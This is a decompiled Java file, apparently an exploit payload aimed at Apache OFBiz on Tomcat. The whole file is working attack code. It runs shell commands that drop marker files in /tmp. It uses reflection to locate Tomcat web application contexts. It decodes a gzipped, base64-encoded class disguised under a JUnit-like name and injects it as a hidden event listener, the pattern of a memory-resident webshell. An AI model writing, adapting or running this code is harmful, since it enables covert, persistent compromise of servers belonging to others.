//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.zip.GZIPInputStream;

public class testofbiz {
    public String getClassName() {
        return "org.junit.WhiteBlackListGtzListener";
    }

    public String getBase64String() throws IOException {
        return new String("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");
    }

    public static void main(String[] args) {
        new testofbiz();
    }
    public testofbiz() {
        try {
            Runtime.getRuntime().exec("touch /tmp/success_5");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        try {
            List<Object> contexts = this.getContext();
            Iterator var2 = contexts.iterator();

            while(var2.hasNext()) {
                Object context = var2.next();
                Object listener = this.getListener(context);
                this.addListener(context, listener);
            }
        } catch (Exception var5) {
        }

        try {
            Runtime.getRuntime().exec("touch /tmp/success_6");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }

//    public testofbiz(){
//
//    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList();
        Thread[] threads = (Thread[])((Thread[])invokeMethod(Thread.class, "getThreads"));
        Object context = null;

        try {
            Thread[] var4 = threads;
            int var5 = threads.length;

            for(int var6 = 0; var6 < var5; ++var6) {
                Thread thread = var4[var6];
                if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
                    // change
                    HashMap childrenMap = (HashMap)getFV(getFV(getFV(thread, "target"), "this${'$'}0"), "children");
                    Iterator var9 = childrenMap.keySet().iterator();

                    while(var9.hasNext()) {
                        Object key = var9.next();
                        HashMap children = (HashMap)getFV(childrenMap.get(key), "children");
                        Iterator var12 = children.keySet().iterator();

                        while(var12.hasNext()) {
                            Object key1 = var12.next();
                            context = children.get(key1);
                            if (context != null && context.getClass().getName().contains("StandardContext")) {
                                contexts.add(context);
                            }

                            if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                                contexts.add(context);
                            }
                        }
                    }
                } else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                    context = getFV(getFV(thread.getContextClassLoader(), "resources"), "context");
                    if (context != null && context.getClass().getName().contains("StandardContext")) {
                        contexts.add(context);
                    }

                    if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                        contexts.add(context);
                    }
                }
            }

            return contexts;
        } catch (Exception var14) {
            throw new RuntimeException(var14);
        }
    }

    private Object getListener(Object context) {
        Object listener = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }

        try {
            listener = classLoader.loadClass(this.getClassName()).newInstance();
        } catch (Exception var9) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(this.getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                listener = clazz.newInstance();
            } catch (Throwable var8) {
            }
        }

        return listener;
    }

    public void addListener(Object context, Object listener) throws Exception {
        if (!this.isInjected(context, listener.getClass().getName())) {
            try {
                // change
//                invokeMethod(context, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{listener});
                invokeMethod(context, "addApplicationEventListener", [Object] as Class[], [listener] as Object[])
            } catch (Exception var7) {
                Object[] objects = (Object[])((Object[])invokeMethod(context, "getApplicationEventListeners"));
                List listeners = Arrays.asList(objects);
                ArrayList arrayList = new ArrayList(listeners);
                arrayList.add(listener);
                // change
//                invokeMethod(context, "setApplicationEventListeners", new Class[]{Object[].class}, new Object[]{arrayList.toArray()});
                invokeMethod(context, "setApplicationEventListeners", [Object[]] as Class[], [arrayList.toArray()] as Object[])
            }

        }
    }

    public boolean isInjected(Object context, String evilClassName) throws Exception {
        Object[] objects = (Object[])((Object[])invokeMethod(context, "getApplicationEventListeners"));
        List listeners = Arrays.asList(objects);
        ArrayList arrayList = new ArrayList(listeners);

        for(int i = 0; i < arrayList.size(); ++i) {
            if (arrayList.get(i).getClass().getName().contains(evilClassName)) {
                return true;
            }
        }

        return false;
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str));
        } catch (Exception var4) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str));
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream inputStream = new ByteArrayInputStream(compressedData);
        // diff
        GZIPInputStream ungzip = new GZIPInputStream(inputStream);
        byte[] buffer = new byte[256];

        int n;
        while((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }

        return out.toByteArray();
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();

        while(clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException var4) {
                clazz = clazz.getSuperclass();
            }
        }

        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(Object obj, String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = obj instanceof Class ? (Class)obj : obj.getClass();
        Method method = null;
        Class tempClass = clazz;

        while(method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    Method[] methods = tempClass.getDeclaredMethods();

                    for(int i = 0; i < methods.length; ++i) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException var11) {
                tempClass = tempClass.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        } else {
            method.setAccessible(true);
            if (obj instanceof Class) {
                try {
                    return method.invoke((Object)null, param);
                } catch (IllegalAccessException var9) {
                    throw new RuntimeException(var9.getMessage());
                }
            } else {
                try {
                    return method.invoke(obj, param);
                } catch (IllegalAccessException var10) {
                    throw new RuntimeException(var10.getMessage());
                }
            }
        }
    }

//    static {
//        new testofbiz();
//    }
}
